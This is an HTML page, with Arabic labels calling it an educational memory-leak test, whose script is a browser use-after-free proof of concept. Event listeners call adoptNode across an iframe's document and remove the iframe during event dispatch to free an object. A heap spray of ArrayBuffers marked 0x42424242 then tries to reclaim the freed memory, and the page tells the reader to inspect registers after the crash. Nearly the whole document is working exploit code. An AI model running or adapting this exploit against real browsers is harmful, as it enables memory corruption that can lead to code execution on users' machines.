<!DOCTYPE html>
<html>
<body>
    <h3>تجربة التعليمية: اختبار تسريب الذاكرة (Memory Leak Primitive)</h3>
    <button onclick="testMemoryLeak()">ابدأ فحص الذاكرة</button>
    <div id="result"></div>

    <script>
        function testMemoryLeak() {
            const f = document.body.appendChild(document.createElement('iframe'));
            const a = document.createElement('div');
            const b = a.appendChild(document.createElement('div'));

            // الخطوة 1: حقن مستمع الحدث الذي سيحفز الـ UAF
            a.addEventListener('a', () => {
                document.adoptNode(a);
                f.remove();
                
                // محاولة تخصيص ذاكرة جديدة فور تحرير الكائن القديم
                // هذا يسمى "Heap Spraying" لمحاولة أخذ مكان الكائن المحرر
                window.spray = new ArrayBuffer(0x1000);
                let view = new Uint32Array(window.spray);
                view[0] = 0x42424242; // نضع نمطاً مميزاً للبحث عنه
            });

            b.addEventListener('a', () => {
                f.contentDocument.adoptNode(a);
            });

            // الخطوة 2: تحفيز الانهيار
            b.dispatchEvent(new Event('a', { bubbles: true }));
            
            document.getElementById('result').innerText = "تمت محاولة التخصيص. تحقق من الـ Regs في حالة الانهيار.";
        }
    </script>
</body>
</html>
